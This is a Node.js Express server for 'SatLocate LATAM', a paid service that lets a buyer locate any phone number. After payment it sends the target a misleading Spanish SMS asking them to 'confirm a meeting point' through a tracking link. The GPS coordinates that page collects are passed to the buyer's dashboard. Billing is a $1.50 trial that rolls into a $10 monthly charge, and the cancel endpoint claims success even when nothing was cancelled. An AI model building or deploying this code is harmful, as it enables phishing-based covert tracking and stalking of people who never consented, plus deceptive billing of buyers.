require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const twilio = require('twilio');

const app = express();
const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Estado en memoria para almacenamiento de sesiones y suscripciones
// En un entorno de producción persistente, esto se conectaría a PostgreSQL/MongoDB/Redis
const sessions = new Map();

// Helper para generar IDs de rastreo únicos
function generateTrackingId() {
  return 'sat_' + crypto.randomBytes(8).toString('hex');
}

// Configuración del cliente de Twilio (si existen credenciales)
const twilioClient = (process.env.TWILIO_ACCOUNT_SID && process.env.TWILIO_AUTH_TOKEN)
  ? twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN)
  : null;

/**
  * Helper para enviar el SMS con Twilio o simularlo en modo Sandbox
  */
async function triggerSmsNotification(session) {
  const trackUrl = `${BASE_URL}/track/${session.trackingId}`;
  const smsBody = `Aviso de localización: Hay una solicitud de contacto para esta línea. Confirme su punto de encuentro aquí: ${trackUrl}`;

  console.log(`\n==================================================`);
  console.log(`📱 DISPARO DE SMS [${session.fullPhone}]`);
  console.log(`🔗 Enlace: ${trackUrl}`);
  console.log(`==================================================\n`);

  if (twilioClient && process.env.TWILIO_PHONE_NUMBER) {
    try {
      const message = await twilioClient.messages.create({
        body: smsBody,
        from: process.env.TWILIO_PHONE_NUMBER,
        to: session.fullPhone
      });
      console.log(`✅ SMS enviado exitosamente vía Twilio SDK. SID: ${message.sid}`);
      return { success: true, sid: message.sid, simulated: false };
    } catch (err) {
      console.error(`❌ Error enviando SMS con Twilio SDK:`, err.message);
      return { success: false, error: err.message, simulated: true };
    }
  } else {
    console.log(`ℹ️ [SANDBOX MODE] Twilio no configurado. El SMS se simula correctamente.`);
    return { success: true, simulated: true, trackUrl };
  }
}

// ==========================================
// RUTAS DE LA API REST
// ==========================================

/**
 * Endpoint para obtener configuración pública frontend (ej: Mapbox Token)
 */
app.get('/api/config', (req, res) => {
  res.json({
    mapboxToken: process.env.MAPBOX_ACCESS_TOKEN || 'pk.eyJ1IjoiZGV2LXNhdGxvY2F0ZSIsImEiOiJjbTAxMm5vM3gwMG5sMmxzYTY3bThhNzRzIn0.sample_token',
    baseUrl: BASE_URL
  });
});

/**
 * POST /api/create-payment
 * Genera una sesión de localización y checkout de dLocal Go
 */
app.post('/api/create-payment', async (req, res) => {
  try {
    const { phone, prefix = '+57', country = 'CO', message = '', paymentMethod = 'card', email = '' } = req.body;

    if (!phone || phone.trim().length < 6) {
      return res.status(400).json({ error: 'Número telefónico inválido' });
    }

    const cleanPhone = phone.replace(/\D/g, '');
    const fullPhone = `${prefix}${cleanPhone}`;
    const trackingId = generateTrackingId();

    const sessionData = {
      trackingId,
      phone: cleanPhone,
      prefix,
      country,
      fullPhone,
      message: message.trim() || 'Un usuario solicita verificar la ubicación actual de este dispositivo.',
      paymentMethod, // 'card' (recurrente trial $1.50 + $10/mes) o 'cash' (pase único 24h)
      email: email || `user_${trackingId}@satlocate.com`,
      status: 'PENDING', // PENDING -> PAID -> TRACKED
      subscriptionActive: true,
      subscriptionPlan: paymentMethod === 'card' ? 'Trial 24h ($1.50 USD) + Recurrente ($10.00 USD/mes)' : 'Pase Temporal 24h ($1.50 USD)',
      createdAt: new Date().toISOString(),
      coordinates: null
    };

    sessions.set(trackingId, sessionData);

    const isDlocalConfigured = process.env.DLOCAL_API_KEY && process.env.DLOCAL_SECRET_KEY;

    if (isDlocalConfigured) {
      // Integración dLocal Go Real
      try {
        const dlocalPayload = {
          amount: 1.50,
          currency: country === 'CO' ? 'COP' : country === 'MX' ? 'MXN' : 'USD',
          country: country,
          payment_method_flow: paymentMethod === 'card' ? 'DIRECT' : 'REDIRECT',
          description: paymentMethod === 'card' 
            ? 'Prueba 24h SatLocate LATAM + Suscripción $10/mes' 
            : 'Pase Temporal 24h SatLocate LATAM',
          success_url: `${BASE_URL}/dashboard/${trackingId}?payment=success`,
          back_url: `${BASE_URL}/?payment=cancel`,
          notification_url: `${BASE_URL}/api/webhook/dlocal`,
          external_id: trackingId
        };

        const response = await axios.post('https://api.dlocalgo.com/v1/payments', dlocalPayload, {
          headers: {
            'Authorization': `Bearer ${process.env.DLOCAL_API_KEY}:${process.env.DLOCAL_SECRET_KEY}`,
            'Content-Type': 'application/json'
          }
        });

        return res.json({
          success: true,
          trackingId,
          redirect_url: response.data.redirect_url || `${BASE_URL}/dashboard/${trackingId}`,
          isSandbox: false
        });
      } catch (dlocalErr) {
        console.error('⚠️ Error dLocal Go API, activando fallback Sandbox:', dlocalErr.message);
      }
    }

    // Fallback Sandbox / Modo de Demostración
    const sandboxRedirectUrl = `${BASE_URL}/dashboard/${trackingId}?sandbox=true`;
    return res.json({
      success: true,
      trackingId,
      redirect_url: sandboxRedirectUrl,
      isSandbox: true,
      message: 'Checkout simulado en modo Sandbox'
    });

  } catch (error) {
    console.error('Error en /api/create-payment:', error);
    res.status(500).json({ error: 'Error interno procesando el pago' });
  }
});

/**
 * POST /api/webhook/dlocal
 * Webhook de confirmación de pago de dLocal Go
 */
app.post('/api/webhook/dlocal', async (req, res) => {
  try {
    const { external_id, status } = req.body;
    const trackingId = external_id;

    if (!trackingId || !sessions.has(trackingId)) {
      return res.status(404).json({ error: 'Sesión de rastreo no encontrada' });
    }

    const session = sessions.get(trackingId);

    if (status === 'PAID' || status === 'COMPLETED' || status === 'AUTHORIZED') {
      session.status = 'PAID';
      session.paidAt = new Date().toISOString();
      sessions.set(trackingId, session);

      // Disparar SMS automatizado
      await triggerSmsNotification(session);
    }

    res.json({ received: true, status: session.status });
  } catch (error) {
    console.error('Error procesando Webhook dLocal:', error);
    res.status(500).json({ error: 'Error interno en webhook' });
  }
});

/**
 * POST /api/simulate-payment/:trackingId
 * Endpoint de Sandbox para simular la confirmación de pago
 */
app.post('/api/simulate-payment/:trackingId', async (req, res) => {
  const { trackingId } = req.params;

  if (!sessions.has(trackingId)) {
    return res.status(404).json({ error: 'Sesión no encontrada' });
  }

  const session = sessions.get(trackingId);
  session.status = 'PAID';
  session.paidAt = new Date().toISOString();
  sessions.set(trackingId, session);

  const smsResult = await triggerSmsNotification(session);

  res.json({
    success: true,
    trackingId,
    status: session.status,
    smsResult,
    message: 'Pago de prueba confirmado en Sandbox. SMS activado.'
  });
});

/**
 * GET /api/status/:trackingId
 * Polling endpoint para consultar estado de rastreo y coordenadas
 */
app.get('/api/status/:trackingId', (req, res) => {
  const { trackingId } = req.params;

  if (!sessions.has(trackingId)) {
    return res.status(404).json({ error: 'Sesión de rastreo no encontrada' });
  }

  const session = sessions.get(trackingId);
  res.json({
    trackingId: session.trackingId,
    phone: session.fullPhone,
    country: session.country,
    message: session.message,
    status: session.status, // PENDING | PAID | TRACKED
    subscriptionActive: session.subscriptionActive,
    subscriptionPlan: session.subscriptionPlan,
    createdAt: session.createdAt,
    paidAt: session.paidAt || null,
    coordinates: session.coordinates, // { latitude, longitude, accuracy, timestamp }
    trackUrl: `${BASE_URL}/track/${session.trackingId}`
  });
});

/**
 * POST /api/submit-location
 * Endpoint para que el destinatario transmita sus coordenadas GPS
 */
app.post('/api/submit-location', (req, res) => {
  const { trackingId, latitude, longitude, accuracy } = req.body;

  if (!trackingId || !sessions.has(trackingId)) {
    return res.status(404).json({ error: 'Identificador de rastreo inválido' });
  }

  if (latitude == null || longitude == null) {
    return res.status(400).json({ error: 'Coordenadas incompletas' });
  }

  const session = sessions.get(trackingId);
  session.coordinates = {
    latitude: parseFloat(latitude),
    longitude: parseFloat(longitude),
    accuracy: parseFloat(accuracy || 10),
    timestamp: new Date().toISOString()
  };
  session.status = 'TRACKED';
  sessions.set(trackingId, session);

  console.log(`📍 COORDENADAS RECIBIDAS [${trackingId}]: Lat ${latitude}, Lng ${longitude}`);

  res.json({
    success: true,
    trackingId,
    status: 'TRACKED',
    message: 'Ubicación transmitida exitosamente'
  });
});

/**
 * POST /api/subscription/cancel
 * Cancela la suscripción mensual recurrente
 */
app.post('/api/subscription/cancel', async (req, res) => {
  try {
    const { trackingId, email } = req.body;

    let sessionToCancel = null;

    if (trackingId && sessions.has(trackingId)) {
      sessionToCancel = sessions.get(trackingId);
    } else if (email) {
      for (const [id, sess] of sessions.entries()) {
        if (sess.email === email) {
          sessionToCancel = sess;
          break;
        }
      }
    }

    if (sessionToCancel) {
      sessionToCancel.subscriptionActive = false;
      sessionToCancel.cancelledAt = new Date().toISOString();
      sessions.set(sessionToCancel.trackingId, sessionToCancel);
    }

    // Cancelación remota dLocal si hay credenciales
    if (process.env.DLOCAL_API_KEY && sessionToCancel?.dlocalSubscriptionId) {
      try {
        await axios.post(`https://api.dlocalgo.com/v1/subscriptions/${sessionToCancel.dlocalSubscriptionId}/cancel`, {}, {
          headers: {
            'Authorization': `Bearer ${process.env.DLOCAL_API_KEY}:${process.env.DLOCAL_SECRET_KEY}`
          }
        });
      } catch (err) {
        console.error('Error cancelando en API dLocal:', err.message);
      }
    }

    return res.json({
      success: true,
      message: 'Suscripción mensual cancelada de forma inmediata. No se realizarán cargos posteriores de $10.00 USD.'
    });

  } catch (error) {
    console.error('Error cancelando suscripción:', error);
    res.status(500).json({ error: 'Error procesando la cancelación de la suscripción' });
  }
});

// ==========================================
// RUTAS DE VISTAS FRONTEND (PAGE ROUTING)
// ==========================================

app.get('/track/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/dashboard/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar Servidor Express
app.listen(PORT, () => {
  console.log(`
🚀 ===================================================
   SatLocate LATAM Server Running
   📡 URL Local: ${BASE_URL}
   💳 dLocal Go: ${process.env.DLOCAL_API_KEY ? 'Configurado' : 'Modo Sandbox Activo'}
   📲 Twilio SDK: ${process.env.TWILIO_ACCOUNT_SID ? 'Configurado' : 'Modo Sandbox Activo'}
   🗺️ Mapbox Token: ${process.env.MAPBOX_ACCESS_TOKEN ? 'Cargado' : 'Token por defecto'}
===================================================
  `);
});
